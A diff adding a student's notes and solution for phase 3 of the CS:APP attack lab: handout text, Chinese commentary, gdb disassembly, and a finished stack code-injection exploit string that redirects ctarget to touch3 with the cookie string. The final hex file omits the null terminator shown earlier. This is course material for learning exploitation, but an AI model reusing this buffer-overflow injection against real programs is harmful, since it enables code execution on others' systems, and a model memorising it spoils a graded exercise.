@@ -1,0 +1,106 @@
+----------------------------------------------------------------------------
+ct3:
+----------------------------------------------------------------------------
+Phase 3 also involves a code injection attack, but passing a string as argument.
+Within the file ctarget there is code for functions hexmatch and touch3 having the following C
+representations:
+
+1 /* Compare string to hex represention of unsigned value */
+2 int hexmatch(unsigned val, char *sval)
+3 {
+4 char cbuf[110];
+5 /* Make position of check string unpredictable */
+6 char *s = cbuf + random() % 100;
+7 sprintf(s, "%.8x", val);
+8 return strncmp(sval, s, 9) == 0;
+9 }
+
+
+11 void touch3(char *sval)
+12 {
+13 vlevel = 3; /* Part of validation protocol */
+14 if (hexmatch(cookie, sval)) {
+15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
+16 validate(3);
+17 } else {
+18 printf("Misfire: You called touch3(\"%s\")\n", sval);
+19 fail(3);
+20 }
+21 exit(0);
+22 }
+
+Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must
+make it appear to touch3 as if you have passed a string representation of your cookie as its argument.
+
+Some Advice:
+• You will need to include a string representation of your cookie in your exploit string. The string should
+consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”
+• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type
+“man ascii” on any Linux machine to see the byte representations of the characters you need.
+• Your injected code should set register %rdi to the address of this string.
+• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
+portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
+where you place the string representation of your cookie.
+
+touch3 会使用 hexmatch 函数进行字符串匹配
+hexmatch 函数将 cookie 从数字转换成了字符串 59b997fa
+也就是我们输入的 cookie 就应该是 59b997fa，对应的十六进制为 
+35 39 62 39 39 37 66 61 ,对应其各个字符的ASCII码
+由建议中说到Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0,需要在字符串末尾加'\0'，也就是35 39 62 39 39 37 66 61 00
+ Your injected code should set register %rdi to the address of this string. 则将rdi作为本题寄存器设置为字符串地址
+最后一个建议说到在调用函数时，它们会将数据压栈，从而覆盖存放在getbuf使用的缓冲区的内存部分，所以需要注意在哪里放cookie
+----------------------------------------------------------------------------
+Dump of assembler code for function hexmatch:
+   0x000000000040184c <+0>:     push   %r12
+   0x000000000040184e <+2>:     push   %rbp
+   0x000000000040184f <+3>:     push   %rbx
+   0x0000000000401850 <+4>:     add    $0xffffffffffffff80,%rsp
+   0x0000000000401854 <+8>:     mov    %edi,%r12d
+.............
+由于 touch3 开头就使用了 push %rbx，将 %rbx 的值写入了栈中，接着使用 callq 调用了 hexmatch 函数，这个操作也会把 0x401916 返回地址写入 touch3 的栈帧中!!!。在 hexmatch 的开头，连续使用了三条 push 指令，修改了栈的内容。以上的几个操作会改变 buf 缓冲区的内容
+为了避免输入的 cookie 被覆盖掉，可以将其放在输入字符串的最后，对应的内存地址为 0x5561dc78 + 48 = 0x5561dca8，其余部分和 ct2相似
+----------------------------------------------------------------------------
+Dump of assembler code for function touch3:
+   0x00000000004018fa <+0>:     push   %rbx
+   0x00000000004018fb <+1>:     mov    %rdi,%rbx
+   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
+   0x0000000000401908 <+14>:    mov    %rdi,%rsi
+   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
+   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>
+   0x0000000000401916 <+28>:    test   %eax,%eax
+   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
+   0x000000000040191a <+32>:    mov    %rbx,%rdx
+   0x000000000040191d <+35>:    mov    $0x403138,%esi
+   0x0000000000401922 <+40>:    mov    $0x1,%edi
+   0x0000000000401927 <+45>:    mov    $0x0,%eax
+   0x000000000040192c <+50>:    call   0x400df0 <__printf_chk@plt>
+   0x0000000000401931 <+55>:    mov    $0x3,%edi
+   0x0000000000401936 <+60>:    call   0x401c8d <validate>
+   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
+   0x000000000040193d <+67>:    mov    %rbx,%rdx
+   0x0000000000401940 <+70>:    mov    $0x403160,%esi
+   0x0000000000401945 <+75>:    mov    $0x1,%edi
+   0x000000000040194a <+80>:    mov    $0x0,%eax
+   0x000000000040194f <+85>:    call   0x400df0 <__printf_chk@plt>
+   0x0000000000401954 <+90>:    mov    $0x3,%edi
+   0x0000000000401959 <+95>:    call   0x401d4f <fail>
+   0x000000000040195e <+100>:   mov    $0x0,%edi
+   0x0000000000401963 <+105>:   call   0x400e40 <exit@plt>
+End of assembler dump.
+----------------------------------------------------------------------------
+48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */
+68 fa 18 40 00       /* pushq  $0x4018fa */
+c3                   /* retq */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00          /* buf 起始地址 */
+35 39 62 39 39 37 66 61 00       /* cookie: 0x59b997fa */
+----------------------------------------------------------------------------
+ct3.txt:
+48 c7 c7 a8 dc 61 55 68
+fa 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+----------------------------------------------------------------------------
